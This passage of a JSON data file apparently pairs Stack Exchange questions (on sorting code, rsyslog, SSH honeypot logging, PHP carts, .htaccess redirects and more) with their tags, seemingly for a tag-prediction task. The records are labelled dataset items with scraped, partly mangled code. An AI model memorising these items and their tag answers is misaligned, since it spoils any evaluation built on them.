of        the Project Gutenberg License included online at www.gutenberg.net    def load_index(self):        with open(INDEX_PATH) as fh:            for line in fh:                (entry_id, name) = line.strip().split(':')                entry = Entry(entry_id, name)                self.add(entry)        self.reindex()    def get_entry(self, entry_id):        entries = super(Dictionary, self).get_entry(entry_id)        if not entries:            entry = Entry(entry_id, '')            if entry.content:                entry.name = entry.content['name']                self.add(entry)                return [entry]        return entriesclass Entry(BaseEntry):    @lazy_property    def content(self):        return load_entry_content(self.name, self.entry_id)An example dictionary file looks like this:chairChair, n. Etym: [OE. chaiere, chaere, OF. chaiere, chaere, F. chaire]1. A movable single seat with a back.2. An official seat, as of a chief magistrate or a judge, but esp.that of a professor; hence, the office itself.The chair of a philosophical school. Whewell.A chair of philology. M. Arnold.3. The presiding officer of an assembly; a chairman; as, to addressthe chair.4. A vehicle for one person; either a sedan borne upon poles, or two-wheeled carriage, drawn by one horse; a gig. Shak.Think what an equipage thou hast in air, And view with scorn twopages and a chair. Pope.5. An iron blok used on railways to support the rails and secure themto the sleepers. Chair days, days of repose and age.-- To put into the chair, to elect as president, or as chairman of ameeting. Macaulay.-- To take the chair, to assume the position of president, or ofchairman of a meeting.I'm looking for a general review:Is this code Pythonic?Is this is good object oriented design? Would you design the class structure differently?Other things you'd do differently? (Apart from using a database to handle the indexing of entries, a feature I plan to add soon.)The open-source project is here.",
    "target": "python;object oriented"
  },
  {
    "id": "_codereview.77792",
    "source": "Merge sort optimization and improvement <eos> How to optimize this merge sort code to make it run faster? And how to call merge_sort function without user input by declaring necessary array in the code? #include <iostream> using namespace std;int a[50];void merge(int,int,int);void merge_sort(int low,int high){int mid;if(low<high){ mid = low + (high-low)/2; //This avoids overflow when low, high are too large  merge_sort(low,mid);  merge_sort(mid+1,high);  merge(low,mid,high); }}void merge(int low,int mid,int high){  int h,i,j,b[50],k;  h=low;  i=low;  j=mid+1;  while((h<=mid)&&(j<=high))  {   if(a[h]<=a[j])  {   b[i]=a[h];   h++;    }  else  {   b[i]=a[j];   j++;   }   i++;  }  if(h>mid) {   for(k=j;k<=high;k++)  {   b[i]=a[k];   i++;  } } else {  for(k=h;k<=mid;k++)   {   b[i]=a[k];   i++;   }  }  for(k=low;k<=high;k++) a[k]=b[k];}int main() { int num,i; cout<< MERGE SORT PROGRAM<<endl; cout<<endl<<endl; cout<<Please Enter THE NUMBER OF ELEMENTS you want to sort [THEN PRESSENTER]:       <<endl;  cin>>num;  cout<<endl;  cout<<Now, Please Enter the ( << num << ) numbers (ELEMENTS) [THEN PRESS      ENTER]:<<endl; for(i=1;i<=num;i++) {  cin>>a[i] ;  }  merge_sort(1,num);  cout<<endl;  cout<<So, the sorted list (using MERGE SORT) will be :<<endl;  cout<<endl<<endl; for(i=1;i<=num;i++) cout<<a[i]<<  ;cout<<endl<<endl<<endl<<endl;return 1;}",
    "target": "c++;optimization;algorithm;mergesort"
  },
  {
    "id": "_webapps.41474",
    "source": "Grouping Columns in Google Spreadsheets <eos> I have a Google Spreadsheet that has 6 or 7 columns that are all related. I would like to group them all under one header, to show this relation. Each column would additionally have its own additional header (C1, C2, C3...) For example,==========================================                 Group Name              |========================================== C1  | C2  | C3  | C4  | C5  | C6  | C7  | ==========================================     |     |     |     |     |     |     |      |     |     |     |     |     |     |      |     |     |     |     |     |     |      |     |     |     |     |     |     |      |     |     |     |     |     |     |      |     |     |     |     |     |     | Is there a way to do this?",
    "target": "google spreadsheets"
  },
  {
    "id": "_softwareengineering.164353",
    "source": "What's the difference between overloading a method and overriding it in Java? <eos> What's the difference between overloading a method and overriding it in Java?Is there a difference in method signature, access specifier, return type, etc.?",
    "target": "java;object oriented"
  },
  {
    "id": "_webmaster.23404",
    "source": "Having google index canonicals but users using parameters - correct? <eos> I'm working on a site that has a search facility with multiple parameters that look up property listings.  The possible parameters are:City, Area, Building Type, Min. Bedrooms, Max Rental Price, Page Number, Sort Order.The 'raw' url, without any rewriting would look something like this:www.mysite.com/city=1&area=1&type=1&bedrooms=3&price=1000&page=3&sort=1While you're using my site, it doesn't matter to me or to you what the URL looks like, so I think I'm happy to work with the so called 'dirty' URL.It matters however, what Googlebot sees, so i'm planning to add a URL rewrite to allow access to pages like:www.mysite.com/london/kensington/apartmentsAnd then i'm planning to add canonicals to make sure that's the page that gets indexed - no matter what your bedroom / price preferences are, what page of results you're on or the order in which you want them to appear.  The idea is that Google will only index fewer, higher quality 'view-all' pages, but users will be able to drill down and refine their results to get very specific.The question however is whether or not this is a correct use of the canonical and whether it will lead to the desired effect?EDITIt doesn't matter if google indexes 'dirty' URLs with parameters (though it should index the clean one when theres one available).  What really matters is that the site gets found when people conduct a relevant search.  Having it above competitor sites is the idea, if they didn't have an SEO strategy.",
    "target": "seo;google search;url rewriting;canonical url"
  },
  {
    "id": "_unix.88943",
    "source": "What's the real point of the -f option on rm? <eos> By reading the GNU coreutils man page for rm, one of the options is -f, which according to the manual,-f, --force          ignore nonexistent files and arguments, never promptNow, I made some tests and show that indeed if I use something likerm -f /nonexisting/directory/it won't complain.What can someone really gain from such an option?Plus the most common examples of deleting directories using rm is somethinglike rm -rf /delete/this/dirThe -r option makes sense, but -f?",
    "target": "rm;options;coreutils"
  },
  {
    "id": "_webapps.70199",
    "source": "How to directly view a Google Visualization API Query URL as a human-readable table or web page? <eos> What is the correct syntax for the URL (see also a related question about documentation) to view a Google Visualization API Query result as a web page containing the tabulated results of the query? Directly in the question subject line implies these constraints:From the URL only, and,Not requiring separate special web pages that read that Javascript output and reformulate it, and,Not requiring manual cut and paste operations, andNot requiring a bridge through a Google document that has to be created (since I want just a direct URL to render the page),My failed attempt: My query is of the form (key value CENSORED):http://spreadsheets.google.com/a/google.com/tq?key=CENSORED&tq=SELECT%20*%20WHERE%20lower(C)%20CONTAINS%20'something'Browsing to that page dumps out the result as one long Javascript call containing JSON encoded info. Useful for programmers I bet, but not for direct viewing of a query result just by browsing to the query URL.Tacking on a &output=html:http://spreadsheets.google.com/a/google.com/tq?key=CENSORED&tq=SELECT%20*%20WHERE%20lower(C)%20CONTAINS%20'something'&output=htmlDoes not change the output. Obviously output=html is not recognized or is ignored (guessing the syntax from Google Spreadsheets URL Syntax and Display Options?). This should be documented but I could not find it (hence another related question)",
    "target": "google spreadsheets"
  },
  {
    "id": "_codereview.121899",
    "source": "Faster QuickSort <eos> I'm trying to make my QuickSort faster than it is and I have got no more ideas about how to make it more efficient for all types of arrays but mostly very big arrays. It uses random to create the Pivot and it uses InsertionSort when the array is less than 15 elements. What do you think guys?I appreciate for any help here to make the code run faster.public class QuickSort    private static Random rand = new Random();    public void sort(int[] v){        QuickSort(v, 0, v.length-1);    }    private void QuickSort (int[] v, int first, int last) {        if (first >= last)            return;        else {            if (last - first < 15) {                InsertionSort(v, first, last);                return;            }            int[] pivotLoc = partitionArray(v, first, last, makePivot(v,first,last));            QuickSort(v, first, pivotLoc[1]);            QuickSort(v, pivotLoc[0], last);        }    }    private int[] partitionArray (int[] v, int first, int last, int pivot) {        while(last => first) {            while(v[first] < pivot) first++;            while(v[last] > pivot) last--;            if (first > last) break;            swap(v, first, last);            first++;            last--;        }        return new int[] {first, last};    }    private void swap(int[] v, int first, int last) {        int temp = v[first];        v[first] = v[last];        v[last] = temp;    }    public void InsertionSort(int[] v, int first, int last) {        int temp;        for (int i=first + 1; i <= last; i++) {            int j = i;            while (j > 0 && v[j-1] > (v[j]) ) {                temp = v[j];                v[j] = v[j-1];                 v[j-1] = temp;                 j--;            }        }    }    private int makePivot (int[] v, int first, int last){        return v[rand.nextInt(last-first+1)+first];    }}",
    "target": "java;sorting;quick sort;insertion sort"
  },
  {
    "id": "_cstheory.12833",
    "source": "Maximizing a convex function where the objective function is separable but the search space is not <eos> The problem statement isGiven convex functions $f_i$ over $X$, find  $$\\arg\\max_{x\\in X} \\sum_i f_i(x)$$Does this kind of problem structure allow one to use specific strategies to solve the problem?Does it help if I also know the lower bound and upper bound of each $\\max_x f_i(x)$ and the corresponding $x$?For example, is there any algorithm like the objective function analogy of branch and bound method ? ",
    "target": "ds.algorithms;approximation algorithms;optimization;convex optimization;approximation"
  },
  {
    "id": "_unix.75734",
    "source": "Is it not possible to store my local websites in my Dropbox folder? <eos> I have a bunch of web sites that I develop, and I run an Apache server locally to do debugging and design. The web sites use Apache, PHP, and MySQL. To be clear, my Apache server is not serving these sites to the internet, I just access them locally.I develop on two machines. One desktop, and one laptop. Both are running Linux Mint, and I try to keep the settings consistent between them. This means I have to duplicate the Apache and PHP configurations. I keep the directory structures the same. I have to make sure to copy the MySQL databases from one machine to the other if I make changes.Which is not ideal. It's prone to human error, especially with keeping the MySQL databases synched. Sometimes I work on one on one machine, forget to export and import the databases, and then after I've done work on the other machine, I have two versions and I can't easily merge them. Also, it's a hassle for making backups.What does work is that I store all my HTML, CSS, and Javascript in a folder in my Dropbox directory. So any changes I make to those files are automatically syncronized. It also means I have a backup in the cloud. Should the need arise, to restore these files if I ever move to a new machine, I just have to install Dropbox and all the files are recovered.The most I have to do if setting up on a new computer is create a symlink to my Dropbox directory where my HTML files are stored:sudo ln -s  /home/dave/Dropbox/Websites /var/www/WebsitesIs there a way I can do this with my Apache settings and MySQL databases as well? Where I can keep them synchronized across both machines in my Dropbox folder, and have a miminum of set up if I go to a new machine?",
    "target": "apache httpd;mysql;dropbox"
  },
  {
    "id": "_unix.371421",
    "source": "Merge two partitions <eos> I have a question, how do I move my /dev/mapper/datos-datos_lv so I can use that space on /? I want to use the space from /dev/mapper/datos on the/` filesystem.df -hFilesystem          Size    Used    Avail   Use%    Mounted on/dev/sda1           92G     5.8G    82G     7%      /devtmpfs            1.9G    0       1.9G    0%      /devtmpfs               1.9G    140K    1.9G    1%      /dev/shmtmpfs               1.9G    41M     1.9G    3%      /runtmpfs               1.9G    0       1.9G    0%      /sys/fs/cgroup/dev/mapper/datos   296GB   63M     281G    1%      /opttmpfs               379M    28K     379M    1%      /run/user/1000What I want to achieve is:df -hFilesystem          Size    Used    Avail   Use%    Mounted on/dev/sda1           388G    5.8G    82G     7%      /devtmpfs            1.9G    0       1.9G    0%      /devtmpfs               1.9G    140K    1.9G    1%      /dev/shmtmpfs               1.9G    41M     1.9G    3%      /runtmpfs               1.9G    0       1.9G    0%      /sys/fs/cgrouptmpfs               379M    28K     379M    1%      /run/user/1000Is there any way to get 388G on /?",
    "target": "linux;filesystems;partition;lvm"
  },
  {
    "id": "_cs.23541",
    "source": "Canonical infinitely ambiguous languages <eos> In an article I am currently reading the grammarS  SS | a | is being described as canonical infinitely ambiguous. The infinitely ambiguous part I have no problem recognizing, but does canonical mean? Does it mean typical, standard example etc.?",
    "target": "formal languages;terminology"
  },
  {
    "id": "_computerscience.4662",
    "source": "My perspective projection is messed up? <eos> So I've been messing with perspective projection matrices recently. I used numpy and GTK/Cairo to make a very small Python renderer. I'm very confused with the results I'm getting though.I took this Homogeneous Coordinates technique from an online lecture. If I understood correctly, the objective is to transform every point inside a Viewing Pyramid that's frustum shaped so they fit in a cube. (Image from of songho.ca)You need a Field of View angle ($\\alpha$), the Near and Far plane distances ($n$ and $f$ respectively), and the aspect ratio ($r$). Firstly you turn every 3D Point into a Homogeneous Point by adding  a 1 like so:\\begin{align*}\\begin{pmatrix}  x & y & z\\end{pmatrix}\\xrightarrow{\\text{4D}}\\begin{bmatrix}  x & y & z & 1\\end{bmatrix}\\end{align*}Then you multiply your point matrix by a perspective projection matrix:\\begin{align*}\\begin{bmatrix}x & y &z & 1 \\end{bmatrix}\\begin{bmatrix}  1\\over\\tan(\\alpha/2) & 0 & 0 & 0\\\\   0 & r\\over\\tan(\\alpha/2) & 0 & 0\\\\  0 & 0 & (f+n)\\over(f-n) & -1 \\\\  0 & 0 & (2nf)\\over(f-n) & 0\\end{bmatrix}=\\begin{bmatrix}x' & y' & z' & w\\end{bmatrix}\\end{align*}And to go back to a 3D point in space you divide by the fourth dimension:\\begin{align*}\\begin{bmatrix}  x' & y' & z' & w\\end{bmatrix}\\xrightarrow{\\text{3D}}\\begin{pmatrix}  x' \\over w & y' \\over w & z' \\over w\\end{pmatrix}\\end{align*}This is exactly what I've done with numpy:def projection_matrix(fov, aspect, near, far):    t = 1/math.tan(math.radians(fov)/2)    a = (far + near)/(far - near)    b = (2*near*far)/(far-near)    r = aspect    return numpy.matrix([[t,   0,   0,   0],                         [0, r*t,   0,   0],                         [0,   0,   a,  -1],                         [0,   0,   b,   0]])But for some reason the renderer is totally messed up. This is supposed to be a spinning cube... What am I missing here?",
    "target": "rendering;projections;camera matrix"
  },
  {
    "id": "_unix.296941",
    "source": "Mixed languages in bash after OS X update to El Capitan <eos> In my user, which has admin privileges, I have several languages enabled, and English (U.S.) is the 'Primary' language:After updating to El Capitan (10.11), I get mixed languages in bash:$ svn upUpdating '.':                     [English]P revisjon 3096.                 [Norwegian]$ lkbash: lk:         [Russian]$Each message is reliably the same language every time. Command not found is always in Russian, On revision #### is always in Norwegian, etc. I know these languages, so this isn't impacting my productivity, but what the dad gum is going on?!$ localeLANG=LC_COLLATE=CLC_CTYPE=UTF-8LC_MESSAGES=CLC_MONETARY=CLC_NUMERIC=CLC_TIME=CLC_ALL=",
    "target": "bash;locale"
  },
  {
    "id": "_unix.388275",
    "source": "SSH: disable password login for root but leaving the prompt <eos> I would like to disable password login for a user. But instead of the error message (Public key) I would not like the user notice that the password login is disabled and prompting him for password.So far I know I can disable password login for all users except one withPasswordAuthentication noMatch User totoPasswordAuthentication yesBut attempting to login as 'not_toto' will result an error message from the server, which I do not wish.Do I need to modify openssh sources to do that? Or is there a configuration option which can do the job?Edit:Having two ssh servers running is an option, so killing connections with iptables or via another method (outside ssh configuration) could do it.Edit 2:I want to do this as I need two ssh instances, one in the official door to get in and the other is a honeypot. So the bots will give their password but never letting them in. (nb: this is a personal project I am the only one using the server and not logging colleagues passwords nor other nasty things, I just want to make some stats on bots)The first ssh server (say official) is OpenSSH_7.4p1 Debian-10+deb9u1, OpenSSL 1.0.2l  25 May 2017, installed with Debian packages.The 'honeypot' is a modified version of Openssh-7.4p1 that logs username and passwords from login attempts.Actually PAM should be enabled on this one but I will double check it. Maybe your option symcbean may be the right one.",
    "target": "ssh;openssh"
  },
  {
    "id": "_codereview.78966",
    "source": "Get alpha numeric count from a string <eos> Following is the code I am using to find a separate count for alphabets and numeric characters in a given alphanumeric string:   Public Sub alphaNumeric(ByVal input As String)        'alphaNumeric(asd23fdg4556g67gh678zxc3xxx)        'input.Count(Char.IsLetterOrDigit)        Dim alphaCount As Integer = 0 '<-- initialize alphabet counter        Dim numericCount As Integer = 0 '<-- initialize numeric counter        For Each c As Char In input '<-- iterate through each character in the input            If IsNumeric(c) = True Then numericCount += 1 '<--- check whether c is numeric? if then increment nunericCounter            If Char.IsLetter(c) = True Then alphaCount += 1 '<--- check whether c is letter? if then increment alphaCount        Next        MsgBox(Number of alphabets :  & alphaCount) '<-- display the result        MsgBox(Number of numerics :  & numericCount)    End SubEverything works fine for me. Let me know how I can make this simpler.",
    "target": "strings;vb.net"
  },
  {
    "id": "_webapps.45449",
    "source": "Can I leave feedback for classified item on eBay? <eos> I want to leave feedback for an item I bought on eBay that was listed as a classified, but I can't even find the item in My eBay.Is it not possible to leave feedback for classifieds?",
    "target": "ebay"
  },
  {
    "id": "_cs.27915",
    "source": "How to implement the regret matching algorithm? <eos> My question is the following: How to calculate the regret in practice?I am trying to implement the regret matching algorithm but I do not understand how to do it.First, I have $n$ players with the joint action space $\\mathcal{A}=\\{a_0, a_1,\\cdots,a_m\\}^n.$Then, I fix some period $T$. The action set $A^t\\in\\mathcal{A}$ is the action set chosen by players at time $t$. After the period $T$ (every player has chosen an action). So I get $u_i(A^t)$.Now the regret of player $i$ of not playing action $a_i$ in the past is: (here $A^t\\oplus a_i$ denotes the strategy set obtained if player $i$ changed its strategy from $a'_i$ to $a_i$)$$\\max\\limits_{a_i\\in A_i}\\left\\{\\dfrac{1}{T}\\sum_{t\\leqslant T}\\left(u_i(A^t\\oplus a_i )-u_i(A^t)\\right)\\right\\}.$$I do not understand how to calculate this summation. Why there is a max over the action $a_i\\in A_i$? Should I calculate the regret of all actions in $A_i$ and calculate the maximum? Also, In Hart's paper, the maximum is $\\max\\{R, 0\\}$. Why is there such a difference? I mean if the regret was:  $\\dfrac{1}{T}\\sum_{t\\leqslant T}\\left(u_i(A^t\\oplus a_i )-u_i(A^t)\\right),$the calculation would be easy for me.The regret is defined in the following two papers [1] (see page 4, equation (2.1c)) and [2] (see page 3, section I, subsection B).A simple adaptive procedure leading to correlated equilibrium by S. Hart et al (2000)Distributed algorithms for approximating wireless network capacity by Michael Dinitz (2010)I would like to get some helps from you. Any suggestions step by step how to implement such an algorithm please?",
    "target": "machine learning;game theory;learning theory"
  },
  {
    "id": "_codereview.54018",
    "source": "A cart that uses SessionID <eos> I wanted to create a cart that I can easily add some item or simply help someone at the other end over the phone.  I decided to create a cart that would store everything on MySQL instead of using $_SESSION.I did not code the whole cart just in case that this idea is very very bad. But I wanted to show what I have done and know your feedback.The MySQL table look like the following:CREATE TABLE IF NOT EXISTS `checkouts` (  `Id` int(11) NOT NULL AUTO_INCREMENT,  `SessionId` varchar(30) NOT NULL,  `LastTouchTime` int(11) NOT NULL,  `ObjectSerialized` text NOT NULL,  PRIMARY KEY (`Id`)) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=0 ;And this is the PHP class:class Checkout{    static $KeepCartFor = 86400;    static $dbCon = null;    private $CheckoutId = null;    private $Cart = array();    private $PromoCode = null;    private $SubTotal = 0.00;            // Please Note that im using GST as the rst ( the cart is kinda made for   easy swap between canada store and usa    private $Gst = 0.00; //Good And Services Taxes    private $Pst = 0.00; //Provincial Tax    private $Shipping = array(Method=>null,Cost=>0.00);    private $Total = 0.00;    private $Customer = array(FirstName=>null,LastName=>null,Email=>null,Home=>null,Work=>null,Cell=>null,Fax=>null,Company=>null,Address1=>null,Address2=>null,Address3=>null,Country=>null,State=>null,City=>null,Zip=>null,isShippingSameAsBilling=>true,ShipFirstName=>null,ShipLastName=>null,ShipCompany=>null,ShipAddress1=>null,ShipAddress2=>null,ShipAddress3=>null,ShipCountry=>null,ShipState=>null,ShipCity=>null,ShipZip=>null);    public function Cart_AddItem($WebsiteId,$Qty = 1)    {        if(!isset($this->Cart[$WebsiteId]))        {            $this->Cart[$WebsiteId] = $this->_GetProductDetail($WebsiteId);            $this->Cart[$WebsiteId]['Qty'] = $Qty;        }        else            $this->Cart[$WebsiteId]['Qty'] += $Qty;        $this->Shipping = array(Method=>null,Cost=>0.00);    }    public function Cart_RemoveItem($WebsiteId,$Qty = null)    {        if(isset($this->Cart[$WebsiteId]))            if(is_null($Qty))                unset($this->Cart[$WebsiteId]);            else            {                if($this->Cart[$WebsiteId]['Qty'] - $Qty <= 0)                    unset($this->Cart[$WebsiteId]);                else                    $this -> Cart[$WebsiteId]['Qty'] -= $Qty;            }        $this->Shipping = array(Method=>null,Cost=>0.00);    }    public function Cart_Emtpy()    {        $this -> Cart = array();        $this -> SubTotal = 0.0;        $this -> Gst = 0.00;        $this -> Pst = 0.00;        $this -> Total = 0.00;    }    public function Cart_GetItems($WithDetail = false)    {        if(!$WithDetail)        {            foreach($this->Cart as $WebsiteId => $Vars)            {                $Return[$WebsiteId] = $Vars['Qty'];            }            return $Return;        }        else            return $this->Cart;    }    private function _RefrechCartVars()    {        $this->SubTotal = 0.00;        $this->Gst = 0.00;        $this->Pst = 0.00;        $this->Total = 0.00;        foreach($this->Cart as $WebsiteId => $Vars)        {            $this->SubTotal += $Vars['ActualPrice']*$Vars['Qty'];        }        if(($this->Customer['isShippingSameAsBilling']?$this->Customer['Country']:$this->Customer['ShipCountry']) == United States)            if(($this->Customer['isShippingSameAsBilling']?$this->Customer['State']:$this->Customer['ShipState']) == New York)                $this->Gst = ($this->SubTotal * 0.07) + (is_null($this->Shipping['Method'])?0.00:$this->Shipping['Cost']);        $this->Total = $this->SubTotal + $this->Gst + (is_null($this->Shipping['Method'])?0.00:$this->Shipping['Cost']);    }    private function _GetProductDetail($WebsiteId)    {        $GetProductDetail = Checkout::$dbCon -> prepare(SELECT * FROM product WHERE id = :Id);        $GetProductDetail -> bindValue(':Id',$WebsiteId);        try{            $GetProductDetail->execute();        }catch(PDOException $e)        {die(Error Getting Product Detail :.$e->getMessage());}        $PD = $GetProductDetail->fetch(PDO::FETCH_ASSOC);        $Return['Brand'] = $PD['brand'];        $Return['ModelNumber'] = $PD['SKU'];        $Return['Title'] = $PD['title'];        $Return['ActualPrice'] = ($PD['pricingtype'] =='promo' && strtotime($PD['enddate']) >= time()?$PD['promoprice']:$PD['price']);        $Return['MSRP'] = $PD['originalprice'];        $Return['PictureUrl'] = $PD['picturelink'];        $Return['Weight'] = $PD['weight'];        $Return['DimensionalWeight'] = number_format($PD['height']*$PD['length']*$PD['width']/166,2);        $Return['CalculatedWeight'] = ($Return['Weight']>=$Return['DimensionalWeight']?$Return['Weight']:$Return['DimensionalWeight']);        return $Return;    }    public function __construct()    {//         Check if have an checkout already        $Prepare = Checkout::$dbCon ->prepare(SELECT * FROM checkouts WHERE SessionId = :SessionId AND LastTouchTime >= :Time ORDER BY Id DESC);        $Prepare -> bindValue(':SessionId',session_id());        $Prepare -> bindValue(':Time',time()-self::$KeepCartFor);        try{            $Prepare -> execute();            if($Prepare -> rowCount() != 0)            {                $Checkout = $Prepare->fetch(PDO::FETCH_ASSOC);                $this->CheckoutId = $Checkout['Id'];                $ThisVar = unserialize($Checkout['ObjectSerialized']);                foreach($ThisVar as $Key => $Val)                    $this->$Key = $Val;                $this->CheckoutId = $Checkout['Id'];            }        }catch(PDOException $e)        { die(Error Getting Checkout From Db: .$e->getMessage()); }    }    public function __destruct()    {        if(is_null($this->CheckoutId))        {// Insert Checkout In Mysql            $CheckWhatIsNextId = Checkout::$dbCon->prepare(SELECT Id FROM checkouts ORDER BY Id DESC LIMIT 0,1);            $CheckWhatIsNextId -> execute();            $NextId = $CheckWhatIsNextId -> fetch(PDO::FETCH_ASSOC);            $this->CheckoutId = $NextId['Id'];            $InsertCheckout = Checkout::$dbCon->prepare(INSERT INTO checkouts (`SessionId`,`LastTouchTime`,`ObjectSerialized`) VALUES(:SessionId,:LastTouchTime,:ObjectSer););            $InsertCheckout -> bindValue(':SessionId',session_id());            $InsertCheckout -> bindValue(':LastTouchTime',time());            $InsertCheckout -> bindValue(':ObjectSer',serialize($this));            try{                $InsertCheckout -> execute();            }catch(PDOException $e)            {                die(Error SavingCart In Db: .$e->getMessage());            }        }        else        {            $UpdateCheckout = Checkout::$dbCon->prepare(UPDATE `checkouts` SET `LastTouchTime` = :Time,ObjectSerialized = :Object WHERE `Id` = :Id;);            $UpdateCheckout -> bindValue(':Time',time());            $UpdateCheckout -> bindValue(':Object',serialize($this));            $UpdateCheckout -> bindValue(':Id',$this->CheckoutId);            try{                $UpdateCheckout -> execute();            }catch(PDOException $e)            {                die(Error SavingCart In Db: .$e->getMessage());            }        }    }}And this next class is simply a little class for my laziness of remembering the DSN of MySQL and port and all for PDO objects:class dbCon extends PDO{    public function __construct($host,$port,$user,$pass,$dbName=null)    {        $pdo_options[PDO::ATTR_ERRMODE] = PDO::ERRMODE_EXCEPTION;        $dsn = 'mysql:host='.$host.';port='.$port.';';        if(!is_null($dbName))            $dsn .='dbname='.$dbName;        try{            parent::__construct($dsn,$user,$pass,$pdo_options);        }catch(PDOException $e){ die(Error Connecting To Database: .$e->getMessage() ); }    }}Technically on any page I can access the cart with only 2 line of code:Checkout::$dbCon = new dbCon(127.0.0.1,3306,UserName,Password,DatabaseName);$Checkout = new Checkout();Maybe there is some security issue that I'm not thinking about, or perhaps I should do something different.  Let me know what you think.",
    "target": "php;mysql"
  },
  {
    "id": "_softwareengineering.132288",
    "source": "How do I Integrate Production Database Hot Fixes into Shared Database Development model? <eos> We are using SQL Source Control 3, SQL Compare, SQL Data Compare from RedGate, Mercurial repositories, TeamCity  and a set of 4 environments including production. I am working on getting us to a dedicated environment per developer, but for at least the next 6 months we are stuck with a shared model.  To summarize our current system, we have a DEV SQL server where developers first make changes/additions.  They commit their changes through SQL Source Control to a local hgdev repository.  When they execute an hg push to the main repository, TeamCity listens for that and then (among other things) pushes hgdev repository to hgrc.  Another TeamCity process listens for that and does a pull from hgrc and deploys the latest to a QA SQL Server where regression and integration tests are run.  When those are passed a push from hgrc to hgprod occurs.  We do a compare of hgprod to our PREPROD SQL Server and generate deployment/rollback scripts for our production release.Separate from the above we have database Hot Fixes that will need to be applied in between releases.  The process there is for our Operations team make changes on the PreProd database, and then after testing, to use SQL Source Control to commit their hot fix changes to hgprod from the PREPROD database, and then do a compare from hgprod to PRODUCTION, create deployment scripts and run them on PRODUCTION.If we were in a dedicated database per developer model, we could simply automatically push hgprod back to hgdev and merge in the hot fix change (through TeamCity monitoring for hgprod checkins) and then developers would pick it up and merge it to their local repository and database periodically.  However, given that with a shared model the DEV database itself is the source of all changes, this won't work. Pushing hotfixes back to hgdev will show up in SQL Source Control as being different than DEV SQL Server and therefore we need to overwrite the reposistory with the change from the DEV SQL Server. My only workaround so far is to just have OPS assign a developer the hotfix ticket with a script attached and then we run their hotfixes against DEV ourselves to merge them back in.  I'm not happy with that solution.  Other than working faster to get to dedicated environment, are they other ways to keep this loop going automatically?",
    "target": "version control;deployment;database development"
  },
  {
    "id": "_datascience.5313",
    "source": "Forecasting sales and creating model <eos> In a assignment we are given macro economic indicators like GDP, Consumer price index, Producer Price index and Industrial production index. Also we are given Crude oil, Sugar prices and FM-CG Sales. We are required to forecast future quarter sales and give a model. As I'm new to this subject, I don't know where to start with it, or what to read. Can anyone provide me with some examples of what to do, or any PDFs which might be helpful. ",
    "target": "predictive modeling;forecast"
  },
  {
    "id": "_unix.246076",
    "source": "Why is syslogd not reporting messages to remote server during and just after the boot? <eos> I configured rsyslog to send logs to a central logging server like this:*.* @@192.168.1.20$ActionExecOnlyWhenPreviousIsSuspended on& @@192.168.1.21& /var/log/failover$ActionExecOnlyWhenPreviousIsSuspended offIt works well, except when machine is booting. When the virtual machine starts and approximately twenty seconds after the machine starts, no messages are sent to 192.168.1.20 or 192.168.1.21. However, /var/log/failover contains all those lost messages.As a test, I started the machine and entered by hand:$ logger 1$ logger 2$ logger 3...The first central logging server contains just:Nov 28 13:57:40 demo arsene: 10The second logging server contains no messages from the demo machine.Finally, var/log/failover on demo machine contains:Nov 28 13:57:10 demo rsyslogd: [origin software=rsyslogd swVersion=7.4.4 x-pid=361 x-info=http://www.rsyslog.com] startNov 28 13:57:10 demo rsyslogd: rsyslogd's groupid changed to 104Nov 28 13:57:10 demo rsyslogd: rsyslogd's userid changed to 101... # more than a hundred usual messages from the kernelNov 28 13:57:20 demo kernel: [   12.127981] random: nonblocking pool is initializedNov 28 13:57:21 demo arsene: 1Nov 28 13:57:22 demo arsene: 2Nov 28 13:57:23 demo arsene: 3Nov 28 13:57:25 demo arsene: 4Nov 28 13:57:27 demo arsene: 5Nov 28 13:57:28 demo arsene: 6Nov 28 13:57:30 demo arsene: 7Nov 28 13:57:32 demo arsene: 8Nov 28 13:57:37 demo arsene: 9I encounter this issue for both Ubuntu and Debian virtual machines.Additional notes:The network connectivity looks fine. If I try ping 192.168.1.20 and curl google.com during the period where the log messages are not sent to the log server, both ping and curl succeed.Disabling the firewall of the logging server has no effect.Running tcpdump shows that nothing is being sent to the log server during the twenty seconds period.Other Ubuntu machines on the network (which were deployed using a very different approach) report their logs to the logging server fine, including during the boot.By comparing the faulty machines to the correct ones, I noticed a version mismatch (7 vs. 8) for rsyslogd. Upgrading rsyslogd on faulty machines to version 8.14.0 haven't fixed the issue, but now I see the following message a bit after the log reporting starts working:Nov 29 02:18:39 demo rsyslogd-2359: action 'action 11' resumed (module 'builtin:omfwd') [v8.14.0 try http://www.rsyslog.com/e/2359 ]diff shows that /etc/rsyslog.conf and /etc/rsyslog.d/*.conf files are exactly the same between the new faulty machines and the old working ones.A apt-get update, apt-get upgrade and even apt-get dist-upgrade haven't fixed the problem.",
    "target": "rsyslog"
  },
  {
    "id": "_webmaster.99608",
    "source": "Encoded 301 redirects don't work, only english one does <eos> I have a .htaccess file that in its end I created some 301 redirects. For example:Redirect 301 /site-building-from-home /Redirect 301 /%D7%9E%D7%96%D7%99%D7%9F-%D7%AA%D7%9B%D7%A0%D7%99%D7%9D /For some reason all redirects with an English alias (say, site-building-from-home) works but all these with encoded aliases (Hebrew-to-machine-language) don't.Do we have an Apache-directives/PCRE expert that can explain this phenomena ?(Note: I used / instead a domain-name+TLD for flexibility considerations).",
    "target": "htaccess;redirects"
  },
  {
    "id": "_codereview.60670",
    "source": "Find floor and ceiling in the BST <eos> Find ceiling and floor in the BinarySearchTree. Looking for code-review, optmizations and best practices.public class FloorCeiling {    private TreeNode root;    public FloorCeiling(List<Integer> items) {         create(items);    }    private void create (List<Integer> items) {        if (items.isEmpty())  {            throw new NullPointerException(The items array is empty.);        }        root = new TreeNode(items.get(0));        final Queue<TreeNode> queue = new LinkedList<TreeNode>();        queue.add(root);        final int half = items.size() / 2;        for (int i = 0; i < half; i++) {            if (items.get(i) != null) {                final TreeNode current = queue.poll();                final int left = 2 * i + 1;                final int right = 2 * i + 2;                if (items.get(left) != null) {                    current.left = new TreeNode(items.get(left));                    queue.add(current.left);                }                if (right < items.size() && items.get(right) != null) {                    current.right = new TreeNode(items.get(right));                    queue.add(current.right);                }            }        }    }    private static class TreeNode {        private TreeNode left;        private int item;        private TreeNode right;        TreeNode(int item) {            this.item = item;        }    }    private static class IntegerObj {        Integer obj = null;    }    public int ceiling (int val) {        IntegerObj iobj = new IntegerObj();        recurseCeiling(root, iobj, val);        return iobj.obj;    }    public int floor (int val) {        IntegerObj iobj = new 